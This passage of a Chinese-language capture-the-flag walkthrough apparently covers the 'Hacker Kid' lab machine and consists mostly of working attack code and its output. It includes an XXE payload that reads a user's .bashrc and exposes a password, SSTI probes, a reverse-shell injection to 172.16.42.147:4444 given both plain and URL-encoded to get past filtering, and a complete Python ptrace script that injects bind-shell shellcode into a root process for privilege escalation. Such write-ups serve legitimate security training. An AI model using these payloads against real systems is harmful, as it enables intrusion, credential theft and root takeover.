<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxetest</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&#x27;file:///home/saket/.bashrc&#x27;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>a<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">tel</span>&gt;</span>a<span class="tag">&lt;/<span class="name">tel</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">email</span>&gt;</span><span class="symbol">&amp;xxetest;</span><span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">password</span>&gt;</span>a<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>没有读取到，需要用php的base64封装器读取</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxetest</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&#x27;php://filter/convert.base64-encode/resource=/home/saket/.bashrc&#x27;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>a<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">tel</span>&gt;</span>a<span class="tag">&lt;/<span class="name">tel</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">email</span>&gt;</span><span class="symbol">&amp;xxetest;</span><span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">password</span>&gt;</span>a<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="../images/pics/%E6%89%93%E9%9D%B6/22.jpg"></p>
<p>读取成功，解码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ~/.bashrc: executed by bash(1) for non-login shells.</span></span><br><span class="line"><span class="comment"># see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)</span></span><br><span class="line"><span class="comment"># for examples</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If not running interactively, don&#x27;t do anything</span></span><br><span class="line"><span class="keyword">case</span> $- <span class="keyword">in</span></span><br><span class="line">    *i*) ;;</span><br><span class="line">      *) <span class="built_in">return</span>;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># don&#x27;t put duplicate lines or lines starting with space in the history.</span></span><br><span class="line"><span class="comment"># See bash(1) for more options</span></span><br><span class="line">HISTCONTROL=ignoreboth</span><br><span class="line"></span><br><span class="line"><span class="comment"># append to the history file, don&#x27;t overwrite it</span></span><br><span class="line"><span class="built_in">shopt</span> -s histappend</span><br><span class="line"></span><br><span class="line"><span class="comment"># for setting history length see HISTSIZE and HISTFILESIZE in bash(1)</span></span><br><span class="line">HISTSIZE=1000</span><br><span class="line">HISTFILESIZE=2000</span><br><span class="line"></span><br><span class="line"><span class="comment"># check the window size after each command and, if necessary,</span></span><br><span class="line"><span class="comment"># update the values of LINES and COLUMNS.</span></span><br><span class="line"><span class="built_in">shopt</span> -s checkwinsize</span><br><span class="line"></span><br><span class="line"><span class="comment"># If set, the pattern &quot;**&quot; used in a pathname expansion context will</span></span><br><span class="line"><span class="comment"># match all files and zero or more directories and subdirectories.</span></span><br><span class="line"><span class="comment">#shopt -s globstar</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make less more friendly for non-text input files, see lesspipe(1)</span></span><br><span class="line">[ -x /usr/bin/lesspipe ] &amp;&amp; <span class="built_in">eval</span> <span class="string">&quot;<span class="subst">$(SHELL=/bin/sh lesspipe)</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># set variable identifying the chroot you work in (used in the prompt below)</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$&#123;debian_chroot:-&#125;</span>&quot;</span> ] &amp;&amp; [ -r /etc/debian_chroot ]; <span class="keyword">then</span></span><br><span class="line">    debian_chroot=$(cat /etc/debian_chroot)</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># set a fancy prompt (non-color, unless we know we &quot;want&quot; color)</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$TERM</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">    xterm-color|*-256color) color_prompt=yes;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># uncomment for a colored prompt, if the terminal has the capability; turned</span></span><br><span class="line"><span class="comment"># off by default to not distract the user: the focus in a terminal window</span></span><br><span class="line"><span class="comment"># should be on the output of commands, not on the prompt</span></span><br><span class="line"><span class="comment">#force_color_prompt=yes</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$force_color_prompt</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> [ -x /usr/bin/tput ] &amp;&amp; tput setaf 1 &gt;&amp;/dev/null; <span class="keyword">then</span></span><br><span class="line">	<span class="comment"># We have color support; assume it&#x27;s compliant with Ecma-48</span></span><br><span class="line">	<span class="comment"># (ISO/IEC-6429). (Lack of such support is extremely rare, and such</span></span><br><span class="line">	<span class="comment"># a case would tend to support setf rather than setaf.)</span></span><br><span class="line">	color_prompt=yes</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">	color_prompt=</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$color_prompt</span>&quot;</span> = yes ]; <span class="keyword">then</span></span><br><span class="line">    PS1=<span class="string">&#x27;$&#123;debian_chroot:+($debian_chroot)&#125;\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ &#x27;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    PS1=<span class="string">&#x27;$&#123;debian_chroot:+($debian_chroot)&#125;\u@\h:\w\$ &#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">unset</span> color_prompt force_color_prompt</span><br><span class="line"></span><br><span class="line"><span class="comment"># If this is an xterm set the title to user@host:dir</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$TERM</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">xterm*|rxvt*)</span><br><span class="line">    PS1=<span class="string">&quot;\[\e]0;<span class="variable">$&#123;debian_chroot:+($debian_chroot)&#125;</span>\u@\h: \w\a\]<span class="variable">$PS1</span>&quot;</span></span><br><span class="line">    ;;</span><br><span class="line">*)</span><br><span class="line">    ;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># enable color support of ls and also add handy aliases</span></span><br><span class="line"><span class="keyword">if</span> [ -x /usr/bin/dircolors ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">test</span> -r ~/.dircolors &amp;&amp; <span class="built_in">eval</span> <span class="string">&quot;<span class="subst">$(dircolors -b ~/.dircolors)</span>&quot;</span> || <span class="built_in">eval</span> <span class="string">&quot;<span class="subst">$(dircolors -b)</span>&quot;</span></span><br><span class="line">    <span class="built_in">alias</span> ls=<span class="string">&#x27;ls --color=auto&#x27;</span></span><br><span class="line">    <span class="comment">#alias dir=&#x27;dir --color=auto&#x27;</span></span><br><span class="line">    <span class="comment">#alias vdir=&#x27;vdir --color=auto&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">alias</span> grep=<span class="string">&#x27;grep --color=auto&#x27;</span></span><br><span class="line">    <span class="built_in">alias</span> fgrep=<span class="string">&#x27;fgrep --color=auto&#x27;</span></span><br><span class="line">    <span class="built_in">alias</span> egrep=<span class="string">&#x27;egrep --color=auto&#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># colored GCC warnings and errors</span></span><br><span class="line"><span class="comment">#export GCC_COLORS=&#x27;error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># some more ls aliases</span></span><br><span class="line"><span class="built_in">alias</span> ll=<span class="string">&#x27;ls -alF&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> la=<span class="string">&#x27;ls -A&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> l=<span class="string">&#x27;ls -CF&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add an &quot;alert&quot; alias for long running commands.  Use like so:</span></span><br><span class="line"><span class="comment">#   sleep 10; alert</span></span><br><span class="line"><span class="built_in">alias</span> alert=<span class="string">&#x27;notify-send --urgency=low -i &quot;$([ $? = 0 ] &amp;&amp; echo terminal || echo error)&quot; &quot;$(history|tail -n1|sed -e &#x27;</span>\<span class="string">&#x27;&#x27;</span>s/^\s*[0-9]\+\s*//;s/[;&amp;|]\s*alert$//<span class="string">&#x27;\&#x27;</span><span class="string">&#x27;)&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Alias definitions.</span></span><br><span class="line"><span class="comment"># You may want to put all your additions into a separate file like</span></span><br><span class="line"><span class="comment"># ~/.bash_aliases, instead of adding them here directly.</span></span><br><span class="line"><span class="comment"># See /usr/share/doc/bash-doc/examples in the bash-doc package.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -f ~/.bash_aliases ]; <span class="keyword">then</span></span><br><span class="line">    . ~/.bash_aliases</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># enable programmable completion features (you don&#x27;t need to enable</span></span><br><span class="line"><span class="comment"># this, if it&#x27;s already enabled in /etc/bash.bashrc and /etc/profile</span></span><br><span class="line"><span class="comment"># sources /etc/bash.bashrc).</span></span><br><span class="line"><span class="keyword">if</span> ! <span class="built_in">shopt</span> -oq posix; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> [ -f /usr/share/bash-completion/bash_completion ]; <span class="keyword">then</span></span><br><span class="line">    . /usr/share/bash-completion/bash_completion</span><br><span class="line">  <span class="keyword">elif</span> [ -f /etc/bash_completion ]; <span class="keyword">then</span></span><br><span class="line">    . /etc/bash_completion</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Setting Password for running python app</span></span><br><span class="line">username=<span class="string">&quot;admin&quot;</span></span><br><span class="line">password=<span class="string">&quot;Saket!#$%@!!&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现账号密码</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">username</span>=<span class="string">&quot;admin&quot;</span></span><br><span class="line"><span class="attr">password</span>=<span class="string">&quot;Saket!#$%@!!&quot;</span></span><br></pre></td></tr></table></figure>

<p>使用该账号登录9999端口，没有成功将admin换成saket成功登录saket/Saket!#$%@!!</p>
<p><img src="../images/pics/%E6%89%93%E9%9D%B6/23.jpg"></p>
<p>登录后发现没有啥内容，根据提示猜测有name参数。</p>
<p><img src="../images/pics/%E6%89%93%E9%9D%B6/24.jpg"></p>
<h3 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h3><p>观察该页面，通过输入的参数在页面输出到对应的位置，很简单，也许就是一个模板页面，尝试SSTI模板注入。</p>
<ul>
<li><strong>通用探测payload1</strong></li>
</ul>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">1</span>+abcxyz&#125;&#125;</span><span class="xml">$&#123;1+abcxyz&#125;&lt;%1+abcxyz%&gt;[abcxyz]</span></span><br></pre></td></tr></table></figure>

<p><img src="../images/pics/%E6%89%93%E9%9D%B6/25.jpg"></p>
<p>如果看到错误，并且返回结果里有我们随便定义的服务端不存在的字符串<code>abcxyz</code>，那很有可能是模板触发的报错，可能存在模板注入漏洞。<strong>返回结果可以判断是python的模板</strong>。</p>
<ul>
<li><strong>通用探测payload2</strong></li>
</ul>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="xml">$&#123;7*7&#125;,</span><span class="template-variable">&#123;&#123;<span class="name">7</span>*<span class="number">7</span>&#125;&#125;</span></span><br></pre></td></tr></table></figure>



<p><img src="../images/pics/%E6%89%93%E9%9D%B6/26.jpg"></p>
<p>可以确定是双层的payload执行了49</p>
<p>也就是如下url就行了</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>hackerkid.blackhat.local:<span class="number">9999</span>/?name=<span class="variable">$&#123;&#123;7*7&#125;</span>&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li><p><strong>注入反弹shell的代码</strong></p>
<p>发现报错</p>
</li>
</ul>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="xml">&#123;% import os %&#125;</span><span class="template-variable">&#123;&#123;<span class="name">os.system</span>(<span class="name">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/172.16.42.147/4444 0&gt;&amp;1&quot;&#x27;</span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="../images/pics/%E6%89%93%E9%9D%B6/27.jpg"></p>
<p><strong>这是模板注入通常会遇到的异常情况</strong>。我们需要做一些编码，混淆，绕过等。</p>
<p>这里我们所有的字符都进行ascii编码，包括<code>&#125;</code>、<code>%</code>、<code>&#123;</code>、<code>&#39;</code>、<code>&quot;</code>、空格等字符</p>
<p><img src="../images/pics/%E6%89%93%E9%9D%B6/28.jpg"> </p>
<p>我们这里直接使用CyberChef进行编码</p>
<p><img src="../images/pics/%E6%89%93%E9%9D%B6/29.jpg"> </p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="meta">%</span><span class="number">7</span>B<span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">20</span>import<span class="meta">%</span><span class="number">20</span>os<span class="meta">%</span><span class="number">20</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">7</span>D<span class="meta">%</span><span class="number">7</span>B<span class="meta">%</span><span class="number">7</span>Bos<span class="meta">%</span><span class="number">2</span>Esystem<span class="meta">%</span><span class="number">28</span><span class="meta">%</span><span class="number">27</span>bash<span class="meta">%</span><span class="number">20</span><span class="meta">%</span><span class="number">2</span>Dc<span class="meta">%</span><span class="number">20</span><span class="meta">%</span><span class="number">22</span>bash<span class="meta">%</span><span class="number">20</span><span class="meta">%</span><span class="number">2</span>Di<span class="meta">%</span><span class="number">20</span><span class="meta">%</span><span class="number">3</span>E<span class="meta">%</span><span class="number">26</span><span class="meta">%</span><span class="number">20</span><span class="meta">%</span><span class="number">2</span>Fdev<span class="meta">%</span><span class="number">2</span>Ftcp<span class="meta">%</span><span class="number">2</span>F<span class="number">172</span><span class="meta">%</span><span class="number">2</span>E<span class="number">16</span><span class="meta">%</span><span class="number">2</span>E<span class="number">42</span><span class="meta">%</span><span class="number">2</span>E<span class="number">147</span><span class="meta">%</span><span class="number">2</span>F<span class="number">4444</span><span class="meta">%</span><span class="number">200</span><span class="meta">%</span><span class="number">3</span>E<span class="meta">%</span><span class="number">261</span><span class="meta">%</span><span class="number">22</span><span class="meta">%</span><span class="number">27</span><span class="meta">%</span><span class="number">29</span><span class="meta">%</span><span class="number">7</span>D<span class="meta">%</span><span class="number">7</span>D</span><br></pre></td></tr></table></figure>

<p>成功反弹了shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@kali ~]# nc -nvlp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line"></span><br><span class="line">connect to [172.16.42.147] from (UNKNOWN) [172.16.42.207] 55092</span><br><span class="line">bash: cannot set terminal process group (650): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">saket@ubuntu:~$</span><br><span class="line">saket@ubuntu:~$</span><br></pre></td></tr></table></figure>





<h2 id="Capabilities权限提升"><a href="#Capabilities权限提升" class="headerlink" title="Capabilities权限提升"></a>Capabilities权限提升</h2><p>Capabilities是内核的一个功能，用来做权限管理。它将系统的特权分成了四十多个权限组。比如wireshark在Linux上如果不是root就不能直接执行，需要添加对应的Capabilites权限<code>setcap cap_net_raw,cap_net_admin=eip /user/bin/dumpcap</code>。</p>
<p>可以通过官方文档了解Capabilites：<a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">https://man7.org/linux/man-pages/man7/capabilities.7.html</a></p>
<ul>
<li><p><strong>递归查询系统所有的Capabilities权限文件，并且将标准错误输出到/dev/null</strong></p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line">saket<span class="meta">@ubuntu</span>:~$ getcap -r / <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br><span class="line">getcap -r / <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p>执行结果为空，单独执行getcap，发现是没有环境变量，那么我们指定路径</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">saket<span class="variable">@ubuntu</span><span class="symbol">:~</span><span class="variable">$ </span>getcap</span><br><span class="line">getcap</span><br><span class="line">Command <span class="string">&#x27;getcap&#x27;</span> is available <span class="keyword">in</span> the following places</span><br><span class="line"> * <span class="regexp">/sbin/getcap</span></span><br><span class="line"> * <span class="regexp">/usr/sbin</span><span class="regexp">/getcap</span></span><br></pre></td></tr></table></figure>

<p>执行指令<code>/sbin/getcap -r / 2&gt;/dev/null</code></p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">saket@ubuntu:~$ <span class="regexp">/sbin/g</span>etcap -r <span class="regexp">/ 2&gt;/</span>dev/<span class="keyword">null</span></span><br><span class="line"><span class="regexp">/sbin/g</span>etcap -r <span class="regexp">/ 2&gt;/</span>dev/<span class="keyword">null</span></span><br><span class="line"><span class="regexp">/snap/</span>core20<span class="regexp">/1695/u</span>sr<span class="regexp">/bin/</span>ping = cap_net_raw+ep</span><br><span class="line"><span class="regexp">/usr/</span>bin/python2.<span class="number">7</span> = cap_sys_ptrace+ep</span><br><span class="line"><span class="regexp">/usr/</span>bin/traceroute6.iputils = cap_net_raw+ep</span><br><span class="line"><span class="regexp">/usr/</span>bin/ping = cap_net_raw+ep</span><br><span class="line"><span class="regexp">/usr/</span>bin/gnome-keyring-daemon = cap_ipc_lock+ep</span><br><span class="line"><span class="regexp">/usr/</span>bin/mtr-packet = cap_net_raw+ep</span><br><span class="line"><span class="regexp">/usr/</span>lib<span class="regexp">/x86_64-linux-gnu/g</span>streamer1.<span class="number">0</span><span class="regexp">/gstreamer-1.0/g</span>st-ptp-helper = cap_net_bind_service,cap_net_admin+ep</span><br></pre></td></tr></table></figure>

<p>发现python2.7具有cap_sys_ptrace权限。这是可以提权的。</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># inject.py# The C program provided at the GitHub Link given below can be used as a reference for writing the python script.</span></span><br><span class="line"><span class="comment"># GitHub Link: https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># Macros defined in &lt;sys/ptrace.h&gt;</span></span><br><span class="line"><span class="comment"># https://code.woboq.org/qt5/include/sys/ptrace.h.html</span></span><br><span class="line"></span><br><span class="line">PTRACE_POKETEXT   = <span class="number">4</span></span><br><span class="line">PTRACE_GETREGS    = <span class="number">12</span></span><br><span class="line">PTRACE_SETREGS    = <span class="number">13</span></span><br><span class="line">PTRACE_ATTACH     = <span class="number">16</span></span><br><span class="line">PTRACE_DETACH     = <span class="number">17</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Structure defined in &lt;sys/user.h&gt;</span></span><br><span class="line"><span class="comment"># https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user_regs_struct</span>(<span class="params">ctypes.Structure</span>):</span></span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">&quot;r15&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r14&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r13&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r12&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rbp&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rbx&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r11&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r10&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r9&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r8&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rax&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rcx&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rdx&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rsi&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rdi&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;orig_rax&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rip&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;cs&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;eflags&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rsp&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;ss&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;fs_base&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;gs_base&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;ds&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;es&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;fs&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;gs&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">libc = ctypes.CDLL(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pid=<span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define argument type and respone type.</span></span><br><span class="line">libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]</span><br><span class="line">libc.ptrace.restype = ctypes.c_uint64</span><br><span class="line"></span><br><span class="line"><span class="comment"># Attach to the process</span></span><br><span class="line">libc.ptrace(PTRACE_ATTACH, pid, <span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line">registers=user_regs_struct()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Retrieve the value stored in registers</span></span><br><span class="line">libc.ptrace(PTRACE_GETREGS, pid, <span class="literal">None</span>, ctypes.byref(registers))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Instruction Pointer: &quot;</span> + <span class="built_in">hex</span>(registers.rip))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Injecting Shellcode at: &quot;</span> + <span class="built_in">hex</span>(registers.rip))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Shell code copied from exploit db.</span></span><br><span class="line">shellcode=<span class="string">&quot;\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Inject the shellcode into the running process byte by byte.</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="built_in">len</span>(shellcode),<span class="number">4</span>):</span><br><span class="line"> </span><br><span class="line">  <span class="comment"># Convert the byte to little endian.</span></span><br><span class="line">  shellcode_byte_int=<span class="built_in">int</span>(shellcode[i:<span class="number">4</span>+i].encode(<span class="string">&#x27;hex&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">  shellcode_byte_little_endian=struct.pack(<span class="string">&quot;&lt;I&quot;</span>, shellcode_byte_int).rstrip(<span class="string">&#x27;\x00&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">  shellcode_byte=<span class="built_in">int</span>(shellcode_byte_little_endian,<span class="number">16</span>)</span><br><span class="line"> </span><br><span class="line">  <span class="comment"># Inject the byte.</span></span><br><span class="line">  libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Shellcode Injected!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Modify the instuction pointer</span></span><br><span class="line">registers.rip=registers.rip+<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set the registers</span></span><br><span class="line">libc.ptrace(PTRACE_SETREGS, pid, <span class="literal">None</span>, ctypes.byref(registers))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Final Instruction Pointer: &quot;</span> + <span class="built_in">hex</span>(registers.rip))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Detach from the process.</span></span><br><span class="line">libc.ptrace(PTRACE_DETACH, pid, <span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在kali上部署该py文件，下载到靶机。</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">saket<span class="variable">@ubuntu</span><span class="symbol">:~</span><span class="variable">$ </span>wget <span class="symbol">http:</span>/<span class="regexp">/172.16.42.146/inject</span>.py</span><br></pre></td></tr></table></figure>

<p>在靶机上找到一个root的进程用于注入(随便挑选一个，这里是snapd，进程id是1311)</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">saket</span>@ubuntu:~$ ps -aux | grep root</span><br><span class="line"><span class="attribute">root</span>        <span class="number">1311</span>  <span class="number">0</span>.<span class="number">1</span>  <span class="number">1</span>.<span class="number">2</span> <span class="number">1022648</span> <span class="number">52100</span> ?       Ssl  Nov<span class="number">18</span>   <span class="number">0</span>:<span class="number">39</span> /usr/lib/snapd/snapd</span><br></pre></td></tr></table></figure>

<p>执行注入，</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">saket@ubuntu:~$ <span class="regexp">/usr/</span>bin<span class="regexp">/python2.7 ./i</span>nject.py <span class="number">1311</span></span><br><span class="line"><span class="regexp">/usr/</span>bin<span class="regexp">/python2.7 ./i</span>nject.py <span class="number">199780</span></span><br><span class="line">Instruction Pointer: <span class="number">0</span>x0L</span><br><span class="line">Injecting Shellcode at: <span class="number">0</span>x0L</span><br><span class="line">Shellcode Injected!!</span><br><span class="line"><span class="keyword">Final</span> Instruction Pointer: <span class="number">0</span>x2L</span><br></pre></td></tr></table></figure>

<p>inject.py注入成功后会在本机开启5600端口。</p>
